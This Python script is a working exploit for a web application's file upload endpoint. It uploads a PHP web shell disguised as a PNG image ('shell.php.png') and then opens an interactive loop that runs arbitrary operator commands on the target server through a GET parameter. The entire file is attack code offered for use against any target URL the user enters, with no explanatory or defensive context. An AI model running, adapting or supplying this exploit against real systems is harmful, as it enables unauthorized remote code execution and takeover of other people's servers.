import requests
import sys
import random
import string


def main():
    target = input("Enter target URL (i.e. http://localhost:80): ")
    if check_target(target) == False:
        print(f"[ - ] The target {target} seems to be down, exiting...")
        sys.exit()
    else:
        print(f"[ + ] The target is up, we are good to go!")

    print("[...] Uploading shell")
    shell_name = shell_upload(target)

    print()
    shell_url = f"{target}/upload/{shell_name}.php"
    print(f"[...] Trying to open the shell @ {shell_url}")
    print()
    webshell(target=target, shell_name=shell_name)


def check_target(target):
    """
    This function is used to check the target for availability.
    """
    status = None
    try:
        check = requests.get(target, timeout=10)
        if check.status_code == 200:
            status = True
        else:
            status = False
    except:
        status = False
    return status


def gen_random_charset():
    """
    This function is used to create a random charset.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10))


SESSION = requests.Session()

def shell_upload(target):
    """
    This function is used for uploading the shell, here you can change things like path of the shell and the shell's content itself.
    """
    shell_name = gen_random_charset()
    target_url = f"{target}/upload.php?id={shell_name}"
    php_shell = '<?php echo shell_exec($_GET["rce"]); ?>'

    file = {"file": ('shell.php.png', php_shell, "image/png", {"Content-Disposition": "form-data"})}
    data = {"pupload": "upload"}

    upload = SESSION.post(url=target_url, files=file, data=data, verify=False)
    if upload.status_code != 200:
        print(f"Uploading {shell_name} failed!")
        sys.exit()

    return shell_name


def webshell(target, shell_name):
    """
    This function is used to take the target and shell name and then it handles user commands.
    """
    shell_url = f"{target}/upload/{shell_name}.php"
    check_shell = SESSION.get(shell_url)

    if check_shell.status_code == 200:
        print("[ + ] We have a shell :)")
    else:
        print("[ ! ] Something's wrong, I can't connect to the shell, exiting!")
        sys.exit()

    print()
    while True:
        command = {'rce': input("Shell> ")}
        user = SESSION.get(shell_url, params=command, verify=False)
        print(user.text)


if __name__ == '__main__':
    main()
